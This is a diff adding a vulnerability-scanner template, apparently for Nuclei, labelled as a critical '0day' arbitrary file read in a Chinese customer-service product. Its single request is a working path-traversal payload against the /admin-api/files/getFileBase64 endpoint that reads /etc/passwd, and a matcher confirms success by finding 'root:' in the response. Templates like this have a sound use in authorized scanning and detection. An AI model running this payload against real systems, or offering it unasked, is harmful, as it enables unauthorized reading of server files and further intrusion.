@@ -1,0 +1,19 @@
+id: 0Day-yihaohulian-lfi
+
+info:
+  name: 智能客服任意文件读取
+  author: Natto97
+  severity: critical
+  description: description
+  reference: reference
+  tags: lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/admin-api/files/getFileBase64?path=../../../../../../../../../../../../../../etc/passwd"
+    matchers:
+      - type: word
+        words:
+          - "root:"
+        part: body
